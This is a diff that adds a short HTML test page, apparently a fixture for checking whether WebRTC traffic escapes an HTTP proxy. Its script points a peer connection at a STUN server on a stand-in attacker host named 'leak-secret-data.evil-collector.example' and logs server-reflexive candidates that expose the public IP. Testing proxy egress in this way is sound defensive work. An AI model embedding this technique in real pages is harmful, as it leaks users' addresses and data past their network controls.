@@ -1,0 +1,11 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Attack: WebRTC / DNS proxy bypass</title></head>
+<body style="font-family:system-ui;margin:48px"><h1>Proxy bypass via WebRTC</h1>
+<p>WebRTC uses UDP and does not go through the HTTP proxy. A STUN hostname also leaks data through DNS.</p>
+<script>
+ const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'},
+                                                  {urls: 'stun:leak-secret-data.evil-collector.example:3478'}]});
+ let srflx = 0;
+ pc.onicecandidate = e => { if (e.candidate && / srflx /.test(e.candidate.candidate)) { srflx++; console.log('LEAK srflx ' + e.candidate.candidate); } };
+ pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o));
+ setTimeout(() => console.log('webrtc srflx=' + srflx), 4000);
+</script></body></html>
